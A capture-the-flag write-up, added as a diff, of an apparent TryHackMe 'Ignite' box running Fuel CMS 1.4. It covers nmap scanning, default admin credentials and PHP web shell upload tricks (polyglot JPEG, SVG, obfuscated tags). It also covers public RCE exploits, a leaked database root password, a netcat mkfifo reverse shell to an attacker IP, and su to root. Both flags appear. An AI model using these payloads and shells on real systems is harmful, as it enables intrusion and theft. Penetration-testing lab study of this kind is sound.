@@ -1,0 +1,438 @@
+IGNITE.
+
+
+
+
+ENUMERATION: SERVICES:
+Quick nmap scan:
+nmap -sS -sV -T4 10.10.58.251
+OUTPUT:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+
+
+
+EXPLORING: WEB:
+Visiting http://10.10.58.251/, we land on the fuel cms v1.4 welcome page. After scrolling a bit, we find an interesting link.
+OUTPUT:
+That's it!
+To access the FUEL admin, go to:
+http://10.10.58.251/fuel
+User name: admin
+Password: admin (you can and should change this password and admin user information after logging in)
+
+
+Note:
+Since everything points to the facts that the site is a clean install with no changes done to it, we try the admin credential pair.
+We manage to get past the portal.
+As to the other directories in the landing site:
+http://10.10.58.251/1fuel/install/fuel_schema.sql: returns 404 (doesn't exist)
+http://10.10.58.251/fuel/application/config/database.php: returns 403 (exists)
+
+we check out the tabs on the side navigation bar:
+There is nothing really interesting other than upload file buttons. It looks like we need to do php injection.
+
+
+
+
+PHP REVERSE SHELL:
+We get the pentest monkey reverse shell and create a copy for this machine:
+cp ~/thm/scripts/shell/pentest_monkey/php-reverse-shell.php .
+
+
+We then modifiy $ip:
+$ip = 10.23.25.109
+
+
+Start our listener:
+nc -lvnp 1234
+Note:
+We use 1234 since it is the default port the script uses (but it can be changed).
+
+
+Note:
+By the looks of it, our safest bet is uploading to SITE > Assets.
+We try to upload the file.
+OUTPUT:
+10.10.58.251 says
+You cannot select a .php file.
+Try again...
+
+
+Note:
+We will try a different php extension.
+Change .php to .php5:
+mv php-reverse-shell.php php-reverse-shell.php5
+
+
+Attempt .php5 upload.
+Note:
+We get the same output.
+
+
+Note:
+Since it looks like it filters for other php extensions, we will try to attach php to an image.
+Attach php shell to image:
+cat image.jpg > shell.jpg
+echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
+
+
+Attempt image upload.
+OUTPUT:
+The filetype you are attempting to upload is not allowed.
+
+
+Note:
+Since the filter still found our raw php, we will now try to use a polyglot file.
+Create start of the image:
+printf '\xFF\xD8' > shell.jpg                 
+
+
+Add php code:
+printf '\xFF\xFE<?php system($_GET["cmd"]); ?>' >> shell.jpg
+
+
+Append rest of our image:
+cat image.jpg >> shell.jpg
+
+
+Create end of image:
+printf '\xFF\xD9' >> shell.jpg
+
+
+Check if the shell is corrupted:
+file shell.jpg
+shell.jpg: JPEG image data
+Note:
+It has the right extension.
+
+
+Attempt to upload our image with hidden php.
+OUTPUT:
+The filetype you are attempting to upload is not allowed.
+
+
+Note:
+After getting our shell rejected multiple times, we check the extensions allowed.
+Selecting the upload button, press CTRL + I.
+OUTPUT:
+<input type="file" name="userfile___0" value="" id="userfile_upload" class="field_type_file multifile accept-jpg,jpeg,jpe,png,gif,mov,mpeg,mp3,wav,aiff,pdf,css,zip,svg MultiFile-applied">
+
+
+Note:
+We can try to upload a svg with php inside.
+Create the svg shell:
+echo '<?php system($_GET['\''cmd'\'']); ?>' > shell.svg
+
+
+Attempt to upload svg shell:
+OUTPUT.
+The filetype you are attempting to upload is not allowed.
+
+
+Obfuscate the php tag (to try bypass simple string matching):
+echo '<?php echo "<" . "?php system(\$_GET[\"cmd\"]); ?>" ?>' > shell.svg
+
+Attempt to upload obfuscated svg shell.
+OUTPUT:
+The filetype you are attempting to upload is not allowed.
+
+
+Put php shell in zip:
+zip shell.zip shell.php
+
+
+Attempt to upload the zip.
+OUTPUT:
+There was an error uploading your file. Please make sure the server is setup to upload files of this size and folders are writable.
+
+
+
+
+Note:
+It doesn't look like file uploads will work. 
+EXPLOIT: NORAJ, Fuel CMS 1.4 - REMOTE CODE EXECUTION (https://github.com/noraj/fuelcms-rce):
+We download the script, and run id to test it out:
+ruby exploit.rb http://10.10.58.251 id
+OUTPUT:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Note:
+It works. However, it doesn't work properly with commands that have multiple words (even when url encoded). Troubleshooting was attempted.
+OUTPUT:
+ruby exploit.rb http://10.10.58.251 "ls -l"
+exploit.rb:42:in `exploit': undefined method `captures' for nil (NoMethodError)
+
+  /system(.+?)<div/mx.match(res.body).captures[0].chomp
+                                     ^^^^^^^^^
+	from exploit.rb:48:in `<main>'
+
+
+We test the follwing:
+1. fuel CMS 1.4.1 - Remote Code Execution (1): https://www.exploit-db.com/exploits/47138
+2. Fuel CMS 1.4.1 - Remote Code Execution (2): https://www.exploit-db.com/exploits/49487
+But both cause errors.
+
+
+
+EXPLOIT: Fuel CMS 1.4.1 - Remote Code Execution (3)
+Run the exploit:
+python3 cms_exploit.py -u http://10.10.58.251
+OUTPUT:
+[+]Connecting...
+Enter Command $
+Note:
+It worked.
+
+
+Find user flag:
+find / -iname "users.txt" 2>/dev/null
+OUTPUT:
+system
+Note:
+Sometimes, script acts weird.
+
+
+List directory:
+ls 
+OUTPUT:
+systemREADME.md
+assets
+composer.json
+contributing.md
+fuel
+index.php
+robots.txt
+
+
+Check user:
+whoami
+OUTPUT:
+systemwww-data
+
+
+Remembering the links we visited when visiting the site, we try to read database.php:
+cat fuel/application/config/database.php
+OUTPUT:
+ystem<?php
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+/*
+| -------------------------------------------------------------------
+| DATABASE CONNECTIVITY SETTINGS
+| -------------------------------------------------------------------
+| This file will contain the settings needed to access your database.
+|
+| For complete instructions please consult the 'Database Connection'
+| page of the User Guide.
+|
+| -------------------------------------------------------------------
+| EXPLANATION OF VARIABLES
+| -------------------------------------------------------------------
+|
+|	['dsn']      The full DSN string describe a connection to the database.
+|	['hostname'] The hostname of your database server.
+|	['username'] The username used to connect to the database
+|	['password'] The password used to connect to the database
+|	['database'] The name of the database you want to connect to
+|	['dbdriver'] The database driver. e.g.: mysqli.
+|			Currently supported:
+|				 cubrid, ibase, mssql, mysql, mysqli, oci8,
+|				 odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
+|	['dbprefix'] You can add an optional prefix, which will be added
+|				 to the table name when using the  Query Builder class
+|	['pconnect'] TRUE/FALSE - Whether to use a persistent connection
+|	['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
+|	['cache_on'] TRUE/FALSE - Enables/disables query caching
+|	['cachedir'] The path to the folder where cache files should be stored
+|	['char_set'] The character set used in communicating with the database
+|	['dbcollat'] The character collation used in communicating with the database
+|				 NOTE: For MySQL and MySQLi databases, this setting is only used
+| 				 as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
+|				 (and in table creation queries made with DB Forge).
+| 				 There is an incompatibility in PHP with mysql_real_escape_string() which
+| 				 can make your site vulnerable to SQL injection if you are using a
+| 				 multi-byte character set and are running versions lower than these.
+| 				 Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
+|	['swap_pre'] A default table prefix that should be swapped with the dbprefix
+|	['encrypt']  Whether or not to use an encrypted connection.
+|
+|			'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
+|			'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
+|
+|				'ssl_key'    - Path to the private key file
+|				'ssl_cert'   - Path to the public key certificate file
+|				'ssl_ca'     - Path to the certificate authority file
+|				'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
+|				'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
+|				'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
+|
+|	['compress'] Whether or not to use client compression (MySQL only)
+|	['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
+|							- good for ensuring strict SQL while developing
+|	['ssl_options']	Used to set various SSL options that can be used when making SSL connections.
+|	['failover'] array - A array with 0 or more data for connections if the main should fail.
+|	['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
+| 				NOTE: Disabling this will also effectively disable both
+| 				$this->db->last_query() and profiling of DB queries.
+| 				When you run a query, with this setting set to TRUE (default),
+| 				CodeIgniter will store the SQL statement for debugging purposes.
+| 				However, this may cause high memory usage, especially if you run
+| 				a lot of SQL queries ... disable this to avoid that problem.
+|
+| The $active_group variable lets you choose which connection group to
+| make active.  By default there is only one group (the 'default' group).
+|
+| The $query_builder variables lets you determine whether or not to load
+| the query builder class.
+*/
+$active_group = 'default';
+$query_builder = TRUE;
+
+$db['default'] = array(
+	'dsn'	=> '',
+	'hostname' => 'localhost',
+	'username' => 'root',
+	'password' => 'mememe',
+	'database' => 'fuel_schema',
+	'dbdriver' => 'mysqli',
+	'dbprefix' => '',
+	'pconnect' => FALSE,
+	'db_debug' => (ENVIRONMENT !== 'production'),
+	'cache_on' => FALSE,
+	'cachedir' => '',
+	'char_set' => 'utf8',
+	'dbcollat' => 'utf8_general_ci',
+	'swap_pre' => '',
+	'encrypt' => FALSE,
+	'compress' => FALSE,
+	'stricton' => FALSE,
+	'failover' => array(),
+	'save_queries' => TRUE
+);
+
+// used for testing purposes
+if (defined('TESTING'))
+{
+	@include(TESTER_PATH.'config/tester_database'.EXT);
+}
+Note:
+We find a valid credential pair (hostname: localhost, username: root, password: mememe) to access the backup database.
+
+
+Note:
+After trying multiple commands (which return system), we find a valid one that returns home directories accesible by the user:
+find /home -type d 2>/dev/null | while read -r d; do [ -x "$d" ] && echo "$d"; done
+OUTPUT:
+system/home
+/home/www-data
+
+
+Check first directory:
+ls sytem/home
+OUTPUT:
+system
+
+
+Check second directory:
+ls /home/www-data
+OUTPUT:
+systemflag.txt
+
+
+Check flag:
+cat /home/www-data/systemflag.txt
+OUTPUT:
+system
+
+
+We check file properties:
+ls -l /home/www-data
+systemtotal 4
+-rw-r--r-- 1 root root 34 Jul 26  2019 flag.txt
+Note:
+We stupidly forgot system wasn't part of the txt name, just the weird usual output.
+
+Cat properly:
+cat /home/www-data/flag.txt
+OUTPUT:
+system6470e394cbf6dab6a91682cc8585059b 
+Real flag (user flag):
+6470e394cbf6dab6a91682cc8585059b
+
+
+Note:
+We want to create a reverse shell, so we can run commands without the bothering system output.
+Start listener:
+nc -lnvp 4444
+
+
+Get reverse shell (netcat section from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.23.25.109 4444 > /tmp/f
+
+
+Check sudo permissions:
+sudo -l
+OUTPUT:
+sudo: no tty present and no askpass program specified.
+Note:
+This means our shell isn't interactive, we dont have askpass.
+
+
+To fix, we allocate a tty:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+OUTPUT:
+www-data@ubuntu:/var/www/html$
+
+
+Stabilizing shell:
+export TERM=xterm
+CTRL + Z
+stty raw -echo
+Note:
+We ran CTRL + Z in the reverse shell, not our machine.
+
+
+Setup reverse shell again:
+Attacker: 
+nc -lvnp 4444
+Machine:
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.23.25.109 4444 > /tmp/f
+export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Attacker:
+CTRL + Z
+stty raw -echo
+fg
+Note:
+We just need to type anything for the $ to show up on screen after the setup.
+
+
+
+
+PRIVESC:
+Check root permissions:
+sudo -l
+[sudo] password for www-data:
+Note: 
+A situation like this is why we want to stabilize the shell. We dont know the password. Doing CTRL + C would kill the shell.
+
+
+Note:
+We remember our credential pair (root, mememe) from the backup.
+Try login as root:
+su root
+OUTPUT:
+root@ubuntu:/var/www/html# 
+
+
+
+
+Note:
+We can finally read the root flag.
+ROOT FLAG:
+Check root flag:
+cat /root/root.txt
+OUTPUT:
+b9bbcb33e11b80be759c4e844862482d 
+
